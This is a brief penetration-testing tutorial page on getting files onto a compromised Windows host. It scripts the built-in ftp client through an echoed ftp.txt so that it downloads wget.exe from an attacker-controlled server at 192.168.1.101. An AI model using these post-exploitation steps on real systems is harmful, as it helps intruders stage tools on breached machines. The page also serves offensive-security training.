<title>FTP</title>
</head><body>Most windows machines have a ftp-client included. But we can't use it interactively since that most likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client.<br/>
<br/>
On the compromised machine we echo out the following commands into a file<br/>
echo open 192.168.1.101 21&gt; ftp.txt<br/>
echo USER username&gt;&gt; ftp.txt<br/>
echo mysecretpassword&gt;&gt; ftp.txt<br/>
echo bin&gt;&gt; ftp.txt<br/>
echo GET wget.exe&gt;&gt; ftp.txt<br/>
echo bye&gt;&gt; ftp.txt<br/>
<br/>
Then run this command to connect to the ftp<br/>
ftp -v -n -s:ftp.txt<br/>
<br/>
Of course you need to have a ftp-server configured with the user username and the password to mysecretpassword.</body></html>
